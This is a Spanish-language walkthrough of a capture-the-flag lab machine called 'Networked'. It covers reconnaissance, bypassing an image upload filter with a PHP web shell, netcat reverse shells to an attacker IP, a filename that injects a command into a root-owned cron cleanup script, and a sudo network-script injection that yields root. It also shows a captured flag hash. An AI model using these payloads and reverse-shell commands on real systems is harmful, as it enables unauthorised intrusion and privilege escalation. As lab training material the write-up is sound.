@@ -1,0 +1,486 @@
+---------------------
+[ NETWORKED MACHINE ]
+---------------------
+
+# Notas sobre la resolución de la máquina NETWORKED por FeathersMcgr4w
+
+[GITHUB]: https://github.com/FeathersMcgr4w/
+
+[Lets Start!]
+
+-----
+| 1 | Ejecutamos un ping para verificar si esta activa la maquina victima --> ping -c 1 10.10.10.146
+-----
+        -> ping -c 1 10.10.10.146 -R  (Trace Route)
+
+        [*] ttl: 63 (Linux) => Linux (ttl=64) | Windows (ttl=128)
+
+
+
+-----
+| 2 | Escaneo rápido de Puertos con NMAP
+-----
+
+└─$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.146 -oG allPorts
+
+Puertos Abiertos:
+
+        [*] Open ports: 22, 80
+
+
+
+
+-----
+| 3 | Obtener información detallada con NMAP:
+-----
+
+(scripts de reconocimiento y exportar en formato nmap)
+
+locate .nse | xargs grep "categories" | grep -oP '".*?"' | tr -d '"' | sort -u (scripts de reconocimiento)
+
+
+└─# nmap -sCV -p22,80 10.10.10.146 -oN targeted
+
+
+	INFO: 
+
+	22/tcp open  ssh     OpenSSH 7.4
+
+	80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+
+
+Servidor: Apache httpd 2.4.6
+
+Sistema Operativo: CentOS (Community Enterprise Operating System) es una distribución de Linux basada en RedHat (RHEL)
+
+
+
+-----
+| 4 | Realizamos un curl solo cabezeras
+-----
+
+└─$ curl -sX GET "http://10.10.10.146" -I
+
+HTTP/1.1 200 OK
+Date: Tue, 22 Oct 2024 16:12:48 GMT
+Server: Apache/2.4.6 (CentOS) PHP/5.4.16 <-- * TARGET * --> 
+X-Powered-By: PHP/5.4.16 <-- * TARGET * -->
+Content-Length: 229
+Content-Type: text/html; charset=UTF-8
+
+
+
+
+-----
+| 5 | WHATWEB
+-----
+
+└─$ whatweb 10.10.10.146
+
+http://10.10.10.146 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.146], PHP[5.4.16], X-Powered-By[PHP/5.4.16]
+
+
+
+-----
+| 6 | Realizamos un fuzz con nmap
+-----
+
+nmap --script http-enum -p8080 10.10.10.227 -oN nmapFuzz
+
+	--script http-enum : este script enumera info especifica sobre servidores web http (directorios, archivos, etc)
+
+	-p80 : especificamos el puerto a escanear
+
+
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /backup/: Backup folder w/ directory listing
+|   /icons/: Potentially interesting folder w/ directory listing
+|_  /uploads/: Potentially interesting folder
+
+
+
+-----
+| 7 | Descargar archivo comprimido .tar
+-----
+
+-> http://10.10.10.146/backup/
+
+-> 7z l backup.tar
+
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2019-07-09 04:33:38 .....          229          512  index.php
+2019-07-02 04:38:56 .....         2001         2048  lib.php
+2019-07-02 05:53:53 .....         1871         2048  photos.php
+2019-07-02 05:45:10 .....         1331         1536  upload.php
+
+
+-> http://10.10.10.146/photos.php (ejecutar ruta)
+
+	- Obtenemos algunas img almacenadas en el servidor
+
+	- Las img las jala desde el path /uploads/ "http://10.10.10.146/uploads/127_0_0_4.png" 
+
+
+
+-----
+| 8 | Ver extenciones habilitadas
+-----
+
+-> Descomprimimos el archivo "backup.tar" con 7z x backup.tar
+
+-> Analizamos el código del archivo "upload.php"
+
+	- Extenciones habilitadas: ('.jpg', '.png', '.gif', '.jpeg')
+
+	- Magic Number/byte for files: https://en.wikipedia.org/wiki/List_of_file_signatures
+
+		- PNG: 89 50 4E 47 0D 0A 1A 0A (HEX)
+
+
+-----
+| 9 | Probamos de subir una img formato 'jpg'
+-----
+
+-[*] Descargamos una img de extención .jpg
+
+-[*] Subimos la imagen a -> http://10.10.10.146/upload.php (Browse | Submit)
+
+-[*] Vemos la img en galeria -> http://10.10.10.146/photos.php
+
+-[*] La img se subio correctamente!
+
+
+
+------
+| 10 | Inyectar codigo en la imagen
+------
+
+-[*] nano duck-scary.php.jpg
+
+<?php system($_GET['cmd']); ?>
+
+
+
+------
+| 11 | Subimos Imagen
+------
+
+-[*] Subimos la imagen a -> http://10.10.10.146/upload.php (Browse | Submit)
+
+-[*] Vemos la img en galeria -> http://10.10.10.146/photos.php
+
+-[*] Ejecutamos la ruta de la imagen + comando -> http://10.10.10.146/uploads/10_10_16_4.php.jpg?cmd=ls -l
+
+-[*] Ctrol+U (ver espuesta legible)
+
+total 52
+-rw-r--r--  1 apache apache 15880 Oct 22 19:06 10_10_16_4.jpg
+-rw-r--r--  1 apache apache 15911 Oct 22 19:24 10_10_16_4.php.jpg
+-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png
+-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png
+-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png
+-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
+-r--r--r--. 1 root   root       2 Oct 30  2018 index.html
+
+
+
+------
+| 12 | Ejecutar reverse shell
+------
+
+-[*] Habilitar en nuestra consola Netcat
+
+	-> nc -lvnp 443
+
+-[*] Ejecutar en navegador el comando para shell remota 
+
+http://10.10.10.146/uploads/10_10_16_5.php.jpg?cmd=nc -e /bin/bash 10.10.16.5 443
+
+El siguiente comando le indica a nc que ejecute una shell en el server Apache y que envie la shell al sistema de la IP 10.10.16.5 a traves del puerto 443.
+
+
+	-> 10.10.10.146/uploads/10_10_16_5.php.jpg?cmd=nc -e /bin/bash 10.10.16.5 443
+
+	nc : herramienta de pruebas de red por tcp/udp
+
+	-e /bin/bash : -e (ejecutar) Le indica a nc que ejecute el comando /bin/bash y lo envie al otro sistema (es decir ejecutar una bash)
+
+	10.10.16.5 : dirección a la que nc intentara conectarse para recibir la conexión
+
+	443 : número de puerto de la conexión con la IP especificada
+
+
+
+------
+| 13 | Tratar consola full tty
+------
+
+-[*] Ejecutar Pseudo consola
+
+	-> script /dev/null -c bash
+
+
+-[*] Cambiar a consola /bin/bash:
+
+	bash-4.2$ echo $SHELL
+	/sbin/nologin
+	bash-4.2$ export SHELL=/bin/bash
+	bash-4.2$ echo $SHELL
+	/bin/bash
+
+
+-[*] Nos dirijimos al directorio /home/
+
+	bash-4.2$ ls /home/
+	guly
+	bash-4.2$ cd /home/
+	bash-4.2$ ls -l
+	total 4
+	drwxr-xr-x. 2 guly guly 4096 Oct 26 17:16 guly
+	bash-4.2$ cd guly
+	bash-4.2$ ls -l
+	total 12
+	-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
+	-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
+	-r--------. 1 guly guly  33 Oct 26 16:08 user.txt
+
+
+-> Aqui nos encontramos con una tarea crontab que ejecuta un script de php
+
+	bash-4.2$ cat crontab.guly
+	*/3 * * * * php /home/guly/check_attack.php
+
+
+-[ CRON y CRONTAB ]
+
+Las tareas cron son trabajos programados que se ejecutan automaticamente en intervalos especificos.
+
+	1. Demonio "cron" : es un proceso que se ejecuta en segundo plano y revisa si hay tareas programadas para ejecutarse.
+
+	2. Crontab : es el archivo de configuración donde se especifica la tarea y el tiempo cuando se ejecuta,
+
+	Ejemplo: 30 3 * * * /ruta/al/script.sh
+
+
+	* * * * * (Minuto) (Hora) (Día del mes) (Mes) (Día de semana) 
+
+	Comandos básicos de Crontab:
+
+		- crontab -l (listar tareas del usuario actual)
+		- crontab -r (eliminar todas las tareas)
+		- crontab -e (abrir editor de crontab)
+
+
+
+------
+| 14 | Tenemos que elevar nuestro privilegio a guly
+------
+
+Vamos a obtener una shell con los privilegios de "guly"
+
+
+-[*] Nos vamos a aprovechar del script "check_attack.php" para ejecutar una shell con privilegio de 'guly' y que el daemon ejecute la tarea cromtab 
+
+	exec("rm -f $logpath");
+    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &"); <-- * TARGET * -->
+    echo "rm -f $path$value\n";
+
+
+-[ DATO ]: La función del script "check_attack.php" es iterar todas las imagenes guardadas en el path (/var/www/html/uploads/) para luego borrarlas.
+
+-[ TARGET ]: Nos podemos aprovechar de la siguiente función que ejecuta una función a nivel de sistema (exac()) e injectamos código para llamar a la shell.
+
+	exec("nohup /bin/rm -f $path$value;(** TARGET **) > /dev/null 2>&1 &");
+									  ^^^^^^^^^^^^^^
+
+
+
+-[ EJECUCIÓN ]
+
+1. Nos vamos al directorio /var/www/html/uploads/
+
+	bash-4.2$ cd /var/www/html/uploads/
+
+
+2. Creamos un archivo malicioso que ejecute la llamada a la shell. (Aprovechamos la mala sanitización)
+
+	bash-4.2$ touch '; nc -c bash 10.10.16.5 443'
+	
+
+3. Levantamos en nuestra shell un servicio de netcat: nc -lvnp 443 
+
+
+4. Esperamos que la tarea cromtab se ejecute por el daomon cron
+
+	bash-4.2$ ls -l
+	total 48
+	-rw-r--r--  1 apache apache    44 Oct 26 16:42 10_10_14_7.php%00.png
+	-rw-r--r--  1 apache apache  3617 Oct 26 16:46 10_10_14_7.php.png
+	-rw-r--r--  1 apache apache    44 Oct 26 16:31 10_10_14_7.png
+	-rw-r--r--  1 apache apache 15911 Oct 26 18:40 10_10_16_5.php.jpg
+	-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png
+	-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png
+	-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png
+	-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
+	-rw-r--r--  1 apache apache     0 Oct 26 22:37 ; nc -c bash 10.10.16.5 443
+	-r--r--r--. 1 root   root       2 Oct 30  2018 index.html 
+
+
+5. Despues de unos minutos obtenemos la shell
+
+	└─$ nc -lvnp 443  
+	listening on [any] 443 ...
+	connect to [10.10.16.5] from (UNKNOWN) [10.10.10.146] 44354
+	whoami
+	guly
+
+	script /dev/null -c bash (((PSEUDO CONSOLA)))
+
+	export $SHELL=/bin/bash
+
+	Ctrol+z (Tratamiento full tty)
+
+	stty raw -echo; fg
+
+	reset
+
+	Terminal type? xterm
+
+	export TERM=xterm
+	export SHELL=/bin/bash
+
+
+
+------
+| 15 | Obtenemos primer flag
+------
+
+	[guly@networked ~]$ pwd
+	/home/guly
+
+	[guly@networked ~]$ ls -l
+	total 12
+	-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
+	-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
+	-r--------. 1 guly guly  33 Oct 26 16:08 user.txt
+
+	[guly@networked ~]$ cat user.txt
+	5f26ee4dc00e7dd1d91fe9fff0ea30e3
+
+
+
+------
+| 16 | Escalar privilegio a toor
+------
+
+-[*] Ejecutamos "sudo -l" para listar privilegios sudo del usuario
+
+
+[guly@networked ~]$ sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh  <-- * TARGET * -->
+
+
+
+-[*] Info del sistema
+
+[guly@networked ~]$ cat /etc/os-release
+
+NAME="CentOS Linux"
+VERSION="7 (Core)"
+ID="centos"
+ID_LIKE="rhel fedora"
+VERSION_ID="7"
+PRETTY_NAME="CentOS Linux 7 (Core)"
+ANSI_COLOR="0;31"
+CPE_NAME="cpe:/o:centos:centos:7"
+HOME_URL="https://www.centos.org/"
+BUG_REPORT_URL="https://bugs.centos.org/"
+
+CENTOS_MANTISBT_PROJECT="CentOS-7"
+CENTOS_MANTISBT_PROJECT_VERSION="7"
+REDHAT_SUPPORT_PRODUCT="centos"
+REDHAT_SUPPORT_PRODUCT_VERSION="7"
+
+
+
+
+-[*] Ver si hay alguna vulnerabilidad para centOS + /network-scripts/
+
+-> Google: network-scripts centos7 exploit
+
+	https://seclists.org/fulldisclosure/2019/Apr/24
+
+
+-> [ VULNERABILITY ]
+
+	In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in 
+	the name the system tries to execute the part after the white/blank space. Which means; everything after the first 
+	blank space is executed as root.
+
+	NAME=Network /bin/id  <= Note the blank space
+		^^^^^^^  ^^^^^^^
+	
+
+	Nos podemos aprovechar de una vulnerabilidad del /network-scripts/ en contOS.
+
+	Cuando ejecutamos el script "/usr/local/sbin/changename.sh", nos pide que ingresemos argumentos. Esos argumentos internamente los almacena con un white/blank space.
+	Estos espacios en blanco son el equivalente a ";", por lo cual podriamos introducir como argumento algun comando de sistema y este se ejecutaria con privilegio root.
+
+	
+
+-[*] Prueba
+
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+asasas whoami <-- * EXAMPLE * -->
+interface PROXY_METHOD:
+ererer
+interface BROWSER_ONLY:
+fdfdf
+interface BOOTPROTO:
+fgfgfgf
+root <-- * VULNERABILITY * --> 
+root
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.	
+
+
+Para abusar de esta falla podemos pedir una shell como root y listo!
+
+
+
+-[*] root shell
+
+	[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+
+	interface NAME:
+	dfdf /bin/bash <-- * COMANDO * --> 
+	interface PROXY_METHOD:
+	dfdfd
+	interface BROWSER_ONLY:
+	sdsd
+	interface BOOTPROTO:
+	vbvbv
+
+	[root@networked network-scripts]# whoami <-- * RETORNA SHELL * -->
+	root
+
+	[root@networked network-scripts]# cd /root
+
+	[root@networked network-scripts]# cat root.txt
+
+	me olvide de copiar la flag LOL
